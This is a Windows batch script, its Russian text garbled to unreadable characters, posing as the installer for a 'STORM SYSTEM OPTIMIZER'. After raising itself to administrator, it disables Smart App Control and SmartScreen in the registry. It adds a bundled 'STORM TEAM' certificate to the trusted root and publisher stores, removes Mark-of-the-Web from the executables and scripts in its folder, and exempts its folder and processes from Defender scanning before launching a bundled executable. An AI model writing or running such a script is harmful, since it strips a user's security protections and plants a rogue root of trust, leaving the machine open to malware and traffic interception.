@echo off
chcp 65001 >nul
title STORM SYSTEM OPTIMIZER - ������������� Smart App Control � ������� �����������

:: ============================================================
:: 1. �������� � �������������� ������ ���� ��������������
:: ============================================================
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [i] ������ ���� �������������� ��� ������ ���������� Smart App Control...
    powershell.exe -NoProfile -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo ============================================================
echo   STORM SYSTEM OPTIMIZER v1.0.8 - ������ ���� ����������
echo   (Smart App Control, SmartScreen, Mark-of-the-Web, Defender)
echo ============================================================
echo.

set "SCRIPT_DIR=%~dp0"
set "CERT_FILE=%SCRIPT_DIR%Files\StormTeamRootCA.cer"

if not exist "%CERT_FILE%" (
    set "CERT_FILE=%SCRIPT_DIR%StormTeamRootCA.cer"
)
if not exist "%CERT_FILE%" (
    set "CERT_FILE=%SCRIPT_DIR%Files\STORM_Certificate.cer"
)
if not exist "%CERT_FILE%" (
    set "CERT_FILE=%SCRIPT_DIR%STORM_Certificate.cer"
)
if not exist "%CERT_FILE%" (
    set "CERT_FILE=%SCRIPT_DIR%Files\StormSoftwareRootCA.cer"
)

:: ============================================================
:: 2. ���������� ���������� Smart App Control � SmartScreen
:: ============================================================
echo [1/5] ������ ���������� ����������������� ���������� ������������ (Smart App Control)...
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy" /v "VerifiedAndReputablePolicyState" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy" /v "SAC_PreviousState" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "Off" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f >nul 2>&1
echo [OK] ���������� Smart App Control ������� ��������������!

:: ============================================================
:: 3. ��������� ��������� ����������� STORM TEAM �� ��� ���������
:: ============================================================
echo.
if exist "%CERT_FILE%" (
    echo [2/5] ����������� ������� ��������� ����������� STORM TEAM...
    certutil.exe -addstore -f "Root" "%CERT_FILE%" >nul 2>&1
    certutil.exe -addstore -f "TrustedPublisher" "%CERT_FILE%" >nul 2>&1
    certutil.exe -addstore -f "AuthRoot" "%CERT_FILE%" >nul 2>&1
    certutil.exe -user -addstore -f "Root" "%CERT_FILE%" >nul 2>&1
    certutil.exe -user -addstore -f "TrustedPublisher" "%CERT_FILE%" >nul 2>&1
    echo [OK] ���������� STORM TEAM ������� �������� � ���������� �������� ������ � ��������!
) else (
    echo [!] ���� ����������� �� ������: %CERT_FILE%
)

:: ============================================================
:: 4. ������ ��������-����� ���������� (Mark-of-the-Web)
:: ============================================================
echo.
echo [3/5] ������ ��������-����� ���������� (Unblock Mark-of-the-Web)...
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path '%SCRIPT_DIR%' -Recurse -Include *.exe,*.dll,*.cer,*.bat,*.cmd,*.ps1 | ForEach-Object { Unblock-File -Path $_.FullName -ErrorAction SilentlyContinue }" >nul 2>&1
echo [OK] ��� ����� � ���������� ������� ��������������!

:: ============================================================
:: 5. ���������� ����� ��������� � ���������� Windows Defender
:: ============================================================
echo.
echo [4/5] ���������� ����� ���������� � ���������� ���� ���������...
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\StormSystemOptimizer' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSystemOptimizer.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM_SYSTEM_OPTIMIZER_1.0.8_Setup.exe' -ErrorAction SilentlyContinue" >nul 2>&1
echo [OK] ���������� � ������ �� ���������� ���������!

:: ============================================================
:: 6. ������ ���������� / �����������
:: ============================================================
echo.
echo [5/5] ������ STORM SYSTEM OPTIMIZER v1.0.8...
echo.
echo ============================================================
echo   ������! ��� ���������� ������� �����.
echo ============================================================
echo.

if exist "%SCRIPT_DIR%Files\STORM_SYSTEM_OPTIMIZER_1.0.8_Setup.exe" (
    start "" "%SCRIPT_DIR%Files\STORM_SYSTEM_OPTIMIZER_1.0.8_Setup.exe"
) else if exist "%SCRIPT_DIR%Assembling\StormSystemOptimizer.exe" (
    start "" "%SCRIPT_DIR%Assembling\StormSystemOptimizer.exe"
) else if exist "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_1.0.8_Setup.exe" (
    start "" "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_1.0.8_Setup.exe"
)

timeout /t 3 >nul
exit /b
